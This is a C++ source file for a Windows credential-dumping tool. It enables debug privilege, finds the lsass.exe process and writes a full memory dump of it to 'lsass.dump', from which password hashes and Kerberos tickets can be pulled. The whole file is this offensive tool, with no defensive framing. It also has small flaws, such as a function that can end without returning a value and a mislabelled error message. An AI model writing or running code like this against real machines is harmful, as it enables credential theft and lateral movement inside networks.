#include<Windows.h>
#include<tlhelp32.h>
#include<DbgHelp.h>
#include<iostream>

using namespace std;

#pragma comment(lib,"dbghelp.lib")

bool EnablePrivilege(LPCWSTR priv){
    HANDLE hToken;
    TOKEN_PRIVILEGES tp;
    LUID luid;

    if(!OpenProcessToken(GetCurrentProcess(),TOKEN_ADJUST_PRIVILEGES|TOKEN_QUERY,&hToken)) return false;

    if(!LookupPrivilegeValue(NULL,priv,&luid)) return false;

    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    return AdjustTokenPrivileges(hToken,false,&tp,sizeof(TOKEN_PRIVILEGES),NULL,NULL);
}
DWORD GetLsassPID(){
    PROCESSENTRY32 entry;
    entry.dwSize = sizeof(PROCESSENTRY32);

    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS,entry.th32ProcessID);
    if(Process32First(snapshot,&entry)){
        do{
            if(_wcsicmp(entry.szExeFile,L"lsass.exe") == 0){
                CloseHandle(snapshot);
                return entry.th32ProcessID;
            }
        }while(Process32Next(snapshot,&entry));
    }
    CloseHandle(snapshot);
}
int main(){
    if(!EnablePrivilege(SE_DEBUG_NAME)){
        cerr << "[-] could not find lsass.exe\n";
        return 1;
    }
    DWORD pid = GetLsassPID();
    if(!pid){
        cerr << "[-] failed to get LSASS PID\n";
        return -1;
    }
    HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION|PROCESS_VM_READ,FALSE,pid);
    if(!hProcess){
        cerr << "[-] Failed to process.\n";
        return -1;
    }
    HANDLE hFile = CreateFile(
        "lsass.dump",
        GENERIC_ALL,
        0,
        NULL,
        CREATE_ALWAYS,
        FILE_ATTRIBUTE_NORMAL,
        NULL
    );

    BOOL success = MiniDumpWriteDump(
        hProcess,
        pid,
        hFile,
        MiniDumpWithFullMemory,
        NULL,
        NULL,
        NULL
    );
    if(!success){
        cerr << "[-] Failed to write the minidump due to " << GetLastError() << endl;
        return -1;
    }else{
        cout << "[+] Successfully wrote minidump to file" << endl;
        return 0;
    }
    CloseHandle(hProcess);
    CloseHandle(hFile);

    return 0;
}
